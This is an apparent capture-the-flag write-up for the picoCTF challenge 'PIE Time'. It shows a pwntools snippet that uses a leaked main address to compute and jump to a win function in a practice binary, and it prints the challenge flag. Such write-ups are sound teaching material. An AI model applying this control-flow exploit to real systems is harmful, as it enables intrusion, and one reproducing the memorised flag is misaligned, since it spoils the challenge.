# PIE Time

**difficulty**: easy

## Description

Can you try to get the flag? Beware we have PIE!

## Resources

**vuln**: binary file

**vuln.c**: source code

## How to solve

By running the binary you receive a leak and a prompt:

    Address of main: 0x6070df9e933d
    Enter the address to jump to, ex => 0x12345:

The leaked `main` address defeats PIE. Inspecting the binary reveals a `win` function that prints the flag. We can compute the absolute address of `win` at runtime and send it as the ASCII hex address the program expects.

Use a pwntools script that:

    - reads the leaked line
    - parses the leaked address
    - computes base = leaked - main_rel
    - computes target = base + win_rel
    - sends hex(target) as ASCII

Example snippet (inside your exploit script):

    string = io.recvline().decode()
    print(f"Received string: {string}")
    address = int(string[19:], 16)
    print(f"Leaked address: {hex(address)}")
    main = elf.symbols['main']
    win = elf.symbols['win']
    print(f"Main address: {hex(main)}")
    print(f"Win address: {hex(win)}")
    offset = address - main
    print(f"Calculated offset: {hex(offset)}")
    print(f"Win address with offset: {hex(win + offset)}")
    payload = hex(win + offset).encode()
    io.sendline(payload)
    print(io.recvline())
    print(io.recvline())
    print(io.recvline())

After sending the computed address you should get the flag:

    picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_801240da}

